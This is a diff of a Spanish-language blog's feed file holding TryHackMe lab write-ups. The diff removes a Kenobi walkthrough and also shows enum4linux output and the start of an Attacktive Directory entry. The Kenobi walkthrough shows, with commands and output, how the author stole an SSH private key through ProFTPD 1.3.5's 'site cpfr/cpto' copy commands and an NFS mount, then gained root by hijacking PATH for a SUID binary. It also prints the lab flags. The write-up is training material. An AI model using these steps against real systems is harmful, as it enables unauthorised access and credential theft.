+S-1-5-21-2853212168-2008227510-3551253869-531 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-1049 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-1050 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+ &lt;span class=&quot;o&quot;&gt;=============================================&lt;/span&gt; 
+|    Getting printer info &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.131.72    |
+ &lt;span class=&quot;o&quot;&gt;=============================================&lt;/span&gt; 
+No printers returned.
+
+
+enum4linux &lt;span class=&quot;nb&quot;&gt;complete &lt;/span&gt;on Sun Dec 12 13:46:29 2021
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Obtenemos que el grupo es «WORKGROUP» y es un servicor samba 4.3.11 en Ubunto, eso ya lo teniamos con nmap,
+tambien disponemos de &lt;em&gt;Anonymous&lt;/em&gt; y que las restricciones de la clave es de al menos 5 caracteres, tambien tenemos los usuarios jan y kay.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/basic/hydra.png&quot; alt=&quot;hydra&quot; /&gt;&lt;/p&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="brute forcing" /><category term="hash cracking" /><category term="service enumeration" /><category term="Linux Enumeration" /><category term="id_rsa cracking" /><summary type="html">Esta es una máquina que le permite practicar la piratería de aplicaciones web y la escalada de privilegios.</summary></entry><entry><title type="html">tryhackme: attacktive directory</title><link href="http://localhost:4000/attacktive-directory/" rel="alternate" type="text/html" title="tryhackme: attacktive directory" /><published>2021-11-30T00:00:00-05:00</published><updated>2021-11-30T00:00:00-05:00</updated><id>http://localhost:4000/attacktive-directory</id><content type="html" xml:base="http://localhost:4000/attacktive-directory/">&lt;h2 id=&quot;comprovamos-que-la-maquina-este-iniciada-correctamente-enviandole-un-ping&quot;&gt;Comprovamos que la maquina este iniciada correctamente enviandole un &lt;em&gt;ping&lt;/em&gt;&lt;/h2&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.170.66
 PING 10.10.170.66 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.170.66&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
@@ -1621,201 +1868,4 @@ Welcome to Interactive Mode &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; pre
 &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;key-3-of-3.txt
 x4x8xxxef27x3dee1ex161bx1x7xbxe4
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h2 id=&quot;maquina-terminada&quot;&gt;Maquina terminada&lt;/h2&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="web" /><category term="wordpress" /><summary type="html">Basado en el programa Mr. Robot, ¿puedes rootear esta caja?</summary></entry><entry><title type="html">tryhackme: Kenobi</title><link href="http://localhost:4000/kenobi/" rel="alternate" type="text/html" title="tryhackme: Kenobi" /><published>2021-10-25T00:00:00-05:00</published><updated>2021-10-25T00:00:00-05:00</updated><id>http://localhost:4000/kenobi</id><content type="html" xml:base="http://localhost:4000/kenobi/">&lt;h2 id=&quot;comprovamos-que-la-maquina-este-iniciada-correctamente-enviandole-un-ping&quot;&gt;Comprovamos que la maquina este iniciada correctamente enviandole un &lt;em&gt;ping&lt;/em&gt;&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.37.122
-PING 10.10.37.122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.37.122&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.37.122: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;154 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.37.122 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 153.968/153.968/153.968/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como podemos ver, recibio el paquete enviado, ademas, mediante el &lt;em&gt;ttl&lt;/em&gt; podemos saber que es una maquina  &lt;em&gt;linux&lt;/em&gt;
-tambien podemos usar la utilidad &lt;em&gt;wichSystem.py&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wichSystem.py 10.10.37.122
-
-10.10.37.122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 63&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Linux
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;fase-1-recoleción-de-información&quot;&gt;Fase 1: Recoleción de información&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/kenobi/allports.png&quot; alt=&quot;descripcion imagene&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Descripción de los parámetros:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;-p- : Escanea los puertos especificados, en este caso escanea los 65535 puertos.&lt;/li&gt;
-  &lt;li&gt;-sS : Escanea TCP SYN&lt;/li&gt;
-  &lt;li&gt;–min-rate: Envía paquetes no mas lentos que el número indicado por segundo en nuestro caso 5000.&lt;/li&gt;
-  &lt;li&gt;–open: Muestra solo los puertos abiertos.&lt;/li&gt;
-  &lt;li&gt;-vvv : Muestra la información mientras se esta realizando el escaneo.&lt;/li&gt;
-  &lt;li&gt;-Pn : Omite el descubrimiento de host.&lt;/li&gt;
-  &lt;li&gt;-n : No realiza resolución DNS.&lt;/li&gt;
-  &lt;li&gt;ip: la ip que queremos escanear&lt;/li&gt;
-  &lt;li&gt;-oG : Guarda la salida del escaneo en un formato grepeable (no sea util mas adelante)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Scan the machine with nmap, how many ports are open&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;7&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;vemos que tenemos varios puertos abieros, pero nos fijamos primeramente en el port &lt;em&gt;80&lt;/em&gt; puesto que por &lt;em&gt;default&lt;/em&gt; es el usado 
-para montar un servidor web&lt;/p&gt;
-
-&lt;p&gt;-Solo esta una imagen, y no encontramos nada que nos sera muy util al momento&lt;/p&gt;
-
-&lt;p&gt;utilizaremos la herramienta &lt;em&gt;gobuster&lt;/em&gt; para buscar posibles rutas en el servidor, mientas nos da un resultado seguimos estudiando
-los puertos a ver que conseguimos&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/kenobi/gobuster.png&quot; alt=&quot;imagen gobuster&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;luego del escaneo con &lt;em&gt;gobuster&lt;/em&gt; vamos a la ruta &lt;em&gt;robots.txt&lt;/em&gt; que es la que nos llama la atencion&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User-agent: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-Disallow: /admin.html
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;vamos la ruta que encontramos en &lt;em&gt;robots.txt&lt;/em&gt; pero no encontramos nada que nos llame la atencion.&lt;/p&gt;
-
-&lt;h2 id=&quot;nmap--p-445-scriptsmb-enum-sharesnsesmb-enum-usersnse-1010210100&quot;&gt;nmap -p 445 –script=smb-enum-shares.nse,smb-enum-users.nse 10.10.210.100&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;using the nmap command, how many shares have been found?&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;3&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;El comando anterior esta utilizando varios &lt;em&gt;scripts&lt;/em&gt; de nmap para intenter enumerar posibles usuarios&lt;/p&gt;
-
-&lt;h2 id=&quot;obtenemos-acceso-anonymous-e-intentermos-descargar-el-archivo-logtxt-que-esta-en-el-directorio&quot;&gt;obtenemos acceso anonymous e intentermos descargar el archivo log.txt que esta en el directorio&lt;/h2&gt;
-
-&lt;p&gt;Obtenemos esta respueta gracias a los escaneos que hemos hecho con nmap&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;What port is FTP running on?&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;21&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;estas-dos-soluciones-las-tenemos-previamente-con-el-escaneo-con-nmap&quot;&gt;Estas dos soluciones las tenemos previamente con el escaneo con nmap&lt;/h2&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;What is the version?&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;1.3.5&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Ahora vamos a buscar un &lt;em&gt;exploit&lt;/em&gt; para la version de &lt;em&gt;ProFTPD&lt;/em&gt; usando la herramienta &lt;em&gt;searchsploit&lt;/em&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;How many exploits are there for the ProFTPd running?&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;3&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Nos conectaremos a la maquina usando &lt;em&gt;nc 10.10.98.8 21&lt;/em&gt; y usaremos los comandos&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc 10.10.98.8 21
-220 ProFTPD 1.3.5 Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ProFTPD Default Installation&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.98.8]
-site cpfr /home/kenobi/.ssh/id_rsa 
-350 File or directory exists, ready &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;destination name
-site cpto /var/tmp/id_rsa
-250 Copy successful
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;ahora intentaremos realizar una montura en nuestra maquina de los archivos compartidos&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;mnt
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; mount 10.10.98.8:/var mnt/
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;mnt/tmp/id_rsa &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;ahora procederemos a copiar la &lt;em&gt;id_rsa&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;mnt/tmp/id_rsa &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;cambiamos los permisos a &lt;em&gt;id_rsa&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;procederemos a tratar de conectarnos usando la &lt;em&gt;id_rsa&lt;/em&gt; que obtuvimos anteriormente&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa kenobi@10.10.98.8
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;al estar dentro de la maquina procedemos a buscar la &lt;em&gt;flag&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; kenobi@kenobi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;share  user.txt
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; kenobi@kenobi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
-d0b0f3f53b6caa532a83915e19224899
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;ahora que hemos encontrado la primer &lt;em&gt;flag&lt;/em&gt; pasamos a buscar la manera de ganar acceso como &lt;em&gt;superusuario&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kenobi@kenobi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
-/sbin/mount.nfs
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/snapd/snap-confine
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/openssh/ssh-keysign
-/usr/bin/menu
-/bin/su
-/bin/ping6
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;como podemos ver, tenemos varias archivos con permisos &lt;em&gt;SUID&lt;/em&gt;, pero nos llama la atencion el llamado &lt;em&gt;menu&lt;/em&gt;
-ahora vamos a ver que funcion cumple el archivo y como nos podemos aprovechar&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;partimos de la premisa de que este archivo se ejecuta com permisos &lt;em&gt;SUID&lt;/em&gt;; Lo que intentaremos sera manipular el PATH para obtener
-una &lt;em&gt;shell&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kenobi@kenobi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
-kenobi@kenobi:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; /bin/sh &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; curl
-kenobi@kenobi:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;777 curl
-kenobi@kenobi:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;ul&gt;
-  &lt;li&gt;Creamos un archivo curl&lt;/li&gt;
-  &lt;li&gt;le damos permisos&lt;/li&gt;
-  &lt;li&gt;exportamos el path&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kenobi@kenobi:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/menu
-
-&lt;span class=&quot;k&quot;&gt;***************************************&lt;/span&gt;
-1. status check
-2. kernel version
-3. ifconfig
-&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; Enter your choice :1
- &lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
-root
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;ahora que somos &lt;em&gt;root&lt;/em&gt; solo nos queda encontrar la &lt;em&gt;flag&lt;/em&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# cd root&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
-root.txt
-&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
-root.txt
-&lt;span class=&quot;c&quot;&gt;# cat root.txt&lt;/span&gt;
-177b3cd8562289f37382721c28381f02
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="FTP" /><category term="SSH" /><category term="SUID" /><summary type="html">Tutorial sobre la explotación de una máquina Linux. Enumere Samba para compartir, manipule una versión vulnerable de proftpd y aumente sus privilegios con la manipulación de la variable de ruta.</summary></entry></feed>
+&lt;h2 id=&quot;maquina-terminada&quot;&gt;Maquina terminada&lt;/h2&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="web" /><category term="wordpress" /><summary type="html">Basado en el programa Mr. Robot, ¿puedes rootear esta caja?</summary></entry></feed>
